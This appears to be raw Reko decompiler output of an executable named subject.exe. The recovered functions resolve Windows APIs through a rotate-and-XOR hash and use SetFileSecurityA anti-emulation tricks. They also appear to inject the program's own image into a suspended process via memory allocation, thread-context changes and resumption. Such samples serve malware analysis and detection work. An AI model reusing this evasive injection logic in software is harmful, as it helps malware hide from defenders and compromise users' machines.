// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000()
void fn00401000()
{
	GetModuleFileNameA(null, &globals->t4041B0, 0x0104);
	ptr32 esp_56;
	word32 ebp_57;
	byte SCZO_58;
	word32 ebx_59;
	word32 esi_60;
	word32 edi_61;
	word32 eax_62;
	word32 edx_63;
	word32 ecx_64;
	byte cl_65;
	byte SZO_66;
	bool C_67;
	globals->ptr4043B8();
	*(esp_56 - 0x04) = globals->dw404054;
	*(esp_56 - 0x08) = 0x004042B4;
	ptr32 esp_87;
	word32 ebp_88;
	byte SCZO_89;
	word32 ebx_90;
	word32 esi_91;
	word32 edi_92;
	word32 eax_93;
	word32 edx_94;
	word32 ecx_95;
	byte cl_96;
	byte SZO_97;
	bool C_98;
	globals->ptr4043BC();
	*(esp_87 - 0x04) = globals->dw40404C;
	*(esp_87 - 0x08) = 0x004042B4;
	ptr32 esp_117;
	word32 ebp_118;
	byte SCZO_119;
	word32 ebx_120;
	word32 esi_121;
	word32 edi_122;
	word32 eax_123;
	word32 edx_124;
	word32 ecx_125;
	byte cl_126;
	byte SZO_127;
	bool C_128;
	globals->ptr4043BC();
	*(esp_117 - 0x04) = globals->dw404030;
	*(esp_117 - 0x08) = 0x004042B4;
	ptr32 esp_152;
	word32 ebp_153;
	byte SCZO_154;
	word32 ebx_155;
	word32 esi_156;
	word32 edi_157;
	word32 eax_158;
	word32 edx_159;
	word32 ecx_160;
	byte cl_161;
	byte SZO_162;
	bool C_163;
	globals->ptr4043BC();
	*(esp_152 - 0x04) = 0x004041B0;
	*(esp_152 - 0x08) = 0x004042B4;
	ptr32 esp_171;
	word32 ebp_172;
	byte SCZO_173;
	word32 ebx_174;
	word32 esi_175;
	word32 edi_176;
	word32 eax_177;
	word32 edx_178;
	word32 ecx_179;
	byte cl_180;
	byte SZO_181;
	bool C_182;
	globals->ptr4043BC();
	globals->dw4043C0 = 0x44;
	globals->dw4043EC = 0x01;
	globals->w4043F0 = 0x02;
	*(esp_171 - 0x04) = 0x00404404;
	*(esp_171 - 0x08) = 0x004043C0;
	*(esp_171 - 0x0C) = 0x00;
	*(esp_171 - 0x10) = 0x00;
	*(esp_171 - 0x14) = 0x04;
	*(esp_171 - 0x18) = 0x00;
	*(esp_171 - 0x1C) = 0x00;
	*(esp_171 - 0x20) = 0x00;
	*(esp_171 - 0x24) = 0x004042B4;
	*(esp_171 - 0x28) = 0x00;
	ptr32 esp_250;
	word32 ebp_251;
	byte SCZO_252;
	word32 ebx_253;
	word32 esi_254;
	word32 edi_255;
	word32 eax_256;
	word32 edx_257;
	word32 ecx_258;
	byte cl_259;
	byte SZO_260;
	bool C_261;
	globals->ptr404414();
	*(esp_250 - 0x04) = 0x00;
	Eq_4 eax_267 = GetModuleHandleA(*(esp_250 - 0x04));
	Eq_230 eax_295 = eax_267 + (&eax_267->unused)[0x0F] / 0x04;
	*(esp_250 - 0x04) = 0x40;
	*(esp_250 - 0x08) = 0x3000;
	*(esp_250 - 0x0C) = eax_295->dw0050;
	*(esp_250 - 0x10) = (HMODULE *) eax_267;
	*(esp_250 - 0x14) = globals->dw404404;
	ptr32 esp_321;
	word32 ebp_322;
	byte SCZO_323;
	word32 ebx_324;
	struct Eq_271 * esi_325;
	word32 edi_326;
	word32 eax_327;
	word32 edx_328;
	word32 ecx_329;
	byte cl_330;
	byte SZO_331;
	bool C_332;
	globals->ptr404418();
	*(esp_321 - 0x04) = fp - 0x14;
	*(esp_321 - 0x08) = esi_325->dw0050;
	*(esp_321 - 0x0C) = ebx_324;
	*(esp_321 - 0x10) = eax_327;
	*(esp_321 - 0x14) = globals->dw404404;
	ptr32 esp_363;
	word32 ebp_364;
	byte SCZO_365;
	word32 ebx_366;
	word32 esi_367;
	word32 edi_368;
	word32 eax_369;
	word32 edx_370;
	word32 ecx_371;
	byte cl_372;
	byte SZO_373;
	bool C_374;
	globals->ptr40441C();
	globals->dw404420 = 0x00010007;
	*(esp_363 - 0x04) = 0x00404420;
	*(esp_363 - 0x08) = globals->dw404408;
	ptr32 esp_402;
	word32 ebp_403;
	byte SCZO_404;
	word32 ebx_405;
	word32 esi_406;
	word32 edi_407;
	word32 eax_408;
	word32 edx_409;
	word32 ecx_410;
	byte cl_411;
	byte SZO_412;
	bool C_413;
	globals->ptr4046EC();
	globals->dw4044D8 = 4199311;
	*(esp_402 - 0x04) = 0x00404420;
	*(esp_402 - 0x08) = globals->dw404408;
	ptr32 esp_436;
	word32 ebp_437;
	byte SCZO_438;
	word32 ebx_439;
	word32 esi_440;
	word32 edi_441;
	word32 eax_442;
	word32 edx_443;
	word32 ecx_444;
	byte cl_445;
	byte SZO_446;
	bool C_447;
	globals->ptr4046F0();
	*(esp_436 - 0x04) = globals->dw404408;
	word32 esp_463;
	word32 ebp_464;
	byte SCZO_465;
	word32 ebx_466;
	word32 esi_467;
	word32 edi_468;
	word32 eax_469;
	word32 edx_470;
	word32 ecx_471;
	byte cl_472;
	byte SZO_473;
	bool C_474;
	globals->ptr4046F4();
}

// 004017DD: void fn004017DD(Register word32 ebp)
void fn004017DD(word32 ebp)
{
	lstrcpyA(fp - 0x30, globals->t404050);
	Eq_4 eax_25 = LoadLibraryA(fp - 0x30);
	Eq_4 ebx_27 = eax_25;
	if (eax_25 == null)
	{
		lstrcatA(fp - 0x30, globals->t404048);
		LoadLibraryA(fp - 0x30);
		lstrcatA(fp - 0x30, globals->t404000);
		ebx_27 = LoadLibraryA(fp - 0x30);
	}
	globals->ptr404414 = fn00401DDC(ebx_27, 112232641);
	globals->ptr404418 = fn00401DDC(ebx_27, ~0x25C1455F);
	globals->ptr40441C = fn00401DDC(ebx_27, 0xD17F004B);
	globals->ptr4046EC = fn00401DDC(ebx_27, 3936116561);
	globals->ptr4046F0 = fn00401DDC(ebx_27, ~0x156388AE);
	globals->ptr4046F4 = fn00401DDC(ebx_27, 3471424831);
	globals->ptr404D0C = fn00401DDC(ebx_27, 220773272);
	globals->ptr404D10 = fn00401DDC(ebx_27, 553314589);
	globals->ptr4046F8 = fn00401DDC(ebx_27, 0x7DCD8222);
	globals->ptr4043BC = fn00401DDC(ebx_27, 3351994445);
	globals->ptr4043B8 = fn00401DDC(ebx_27, ~0x3830D932);
	globals->ptr404D14 = fn00401DDC(ebx_27, 3324669261);
	globals->ptr404700 = fn00401DDC(ebx_27, ~0x29B12251);
	globals->ptr4046FC = fn00401DDC(ebx_27, 1054485158);
	globals->ptr404704 = fn00401DDC(ebx_27, 882520795);
	globals->ptr404D18 = fn00401DDC(ebx_27, 0xBD923310);
	globals->ptr404D1C = fn00401DDC(ebx_27, 3126133864);
	globals->ptr404D20 = fn00401DDC(ebx_27, 3344200401);
	ptr32 esp_370;
	word32 ebp_371;
	byte SCZO_372;
	word32 ebx_373;
	word32 esi_374;
	word32 eax_375;
	byte SZO_376;
	bool C_377;
	bool Z_378;
	word32 edx_379;
	word32 ecx_380;
	byte cl_381;
	globals->ptr4043B8();
	*(esp_370 - 0x04) = globals->dw404058;
	*(esp_370 - 0x08) = fp - 0x30;
	ptr32 esp_403;
	word32 ebp_404;
	byte SCZO_405;
	word32 ebx_406;
	word32 esi_407;
	word32 eax_408;
	byte SZO_409;
	bool C_410;
	bool Z_411;
	word32 edx_412;
	word32 ecx_413;
	byte cl_414;
	globals->ptr4043BC();
	*(esp_403 - 0x04) = globals->dw404040;
	*(esp_403 - 0x08) = fp - 0x30;
	ptr32 esp_430;
	word32 ebp_431;
	byte SCZO_432;
	word32 ebx_433;
	word32 esi_434;
	word32 eax_435;
	byte SZO_436;
	bool C_437;
	bool Z_438;
	word32 edx_439;
	word32 ecx_440;
	byte cl_441;
	globals->ptr4043BC();
	*(esp_430 - 0x04) = globals->dw404004;
	*(esp_430 - 0x08) = fp - 0x30;
	ptr32 esp_458;
	word32 ebp_459;
	byte SCZO_460;
	word32 ebx_461;
	word32 esi_462;
	word32 eax_463;
	byte SZO_464;
	bool C_465;
	bool Z_466;
	word32 edx_467;
	word32 ecx_468;
	byte cl_469;
	globals->ptr4043BC();
	*(esp_458 - 0x04) = fp - 0x30;
	ptr32 esp_485;
	word32 ebp_486;
	byte SCZO_487;
	word32 ebx_488;
	word32 esi_489;
	word32 eax_490;
	byte SZO_491;
	bool C_492;
	bool Z_493;
	word32 edx_494;
	word32 ecx_495;
	byte cl_496;
	globals->ptr4046F8();
	*(esp_485 - 0x04) = ~0x00316CCF;
	*(esp_485 - 0x08) = eax_490;
	globals->ptr404D24 = fn00401DDC(dwArg00, dwArg04);
	*(esp_485 - 0x04) = ~0x4727C02C;
	*(esp_485 - 0x08) = eax_490;
	globals->ptr404D28 = fn00401DDC(dwArg00, dwArg04);
	*(esp_485 - 0x04) = 0xF8FC0218;
	*(esp_485 - 0x08) = eax_490;
	globals->ptr404D2C = fn00401DDC(dwArg00, dwArg04);
	*(esp_485 - 0x04) = 0x5AA0961C;
	*(esp_485 - 0x08) = eax_490;
	globals->ptr404D30 = fn00401DDC(dwArg00, dwArg04);
	*(esp_485 - 0x04) = 0x9CCB4465;
	*(esp_485 - 0x08) = eax_490;
	globals->ptr404D34 = fn00401DDC(dwArg00, dwArg04);
	*(esp_485 - 0x04) = globals->dw404028;
	ptr32 esp_625;
	word32 ebp_626;
	byte SCZO_627;
	word32 ebx_628;
	word32 esi_629;
	word32 eax_630;
	byte SZO_631;
	bool C_632;
	bool Z_633;
	word32 edx_634;
	word32 ecx_635;
	byte cl_636;
	globals->ptr4046F8();
	*(esp_625 - 0x04) = 3884632733;
	*(esp_625 - 0x08) = eax_630;
	globals->ptr404D38 = fn00401DDC(dwArg00, dwArg04);
	fn00401000();
	*(esp_625 - 0x04) = 0x00;
	word32 esp_689;
	word32 ebp_690;
	byte SCZO_691;
	word32 ebx_692;
	word32 esi_693;
	word32 eax_694;
	byte SZO_695;
	bool C_696;
	bool Z_697;
	word32 edx_698;
	word32 ecx_699;
	byte cl_700;
	globals->ptr404D10();
}

// 00401DDC: Register word32 fn00401DDC(Stack Eq_4 dwArg04, Stack uint32 dwArg08)
word32 fn00401DDC(HMODULE dwArg04, uint32 dwArg08)
{
	ptr32 v5_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	struct Eq_811 * eax_75 = dwArg04 + (&(dwArg04 + (&dwArg04->unused)[0x0F] / 0x04)->unused)[0x001E] / 0x04;
	word16 eax_79[] = dwArg04 + eax_75->dw0024 / 0x04;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		dwArg08 = dwArg08 + 44495;
	if (SetFileSecurityA((CHAR *) 666, 0x00, null) == 0x00)
		dwArg08 = dwArg08 + 916656;
	word32 eax_125[] = dwArg04 + eax_75->dw0020 / 0x04;
	word32 eax_130[] = dwArg04 + eax_75->dw001C / 0x04;
	int32 esi_132 = 0x00;
	while (true)
	{
		word32 eax_163;
		if (esi_132 >= eax_75->dw0018)
			break;
		uint32 eax_184 = 0x00;
		Eq_885 (* ecx_197)[] = dwArg04 + eax_125[esi_132] / 0x04;
		dwLoc3C = dwLoc3C & 0x00;
		while (Mem17[dwLoc3C + ecx_197:byte] != 0x00)
		{
			eax_184 = (eax_184 << 0x07 | eax_184 >>u 0x19) ^ ((int32) Mem17[dwLoc3C + ecx_197:byte] ^ 0x5E);
			dwLoc3C = dwLoc3C + 0x01;
		}
		if (eax_184 == dwArg08)
		{
			eax_163 = dwArg04 + eax_130[(word32) eax_79[esi_132]] / 0x04;
			goto l00401FC6;
		}
		esi_132 = esi_132 + 0x01;
	}
	eax_163 = 0x00;
l00401FC6:
	fs->ptr0000 = v5_14;
	return eax_163;
}

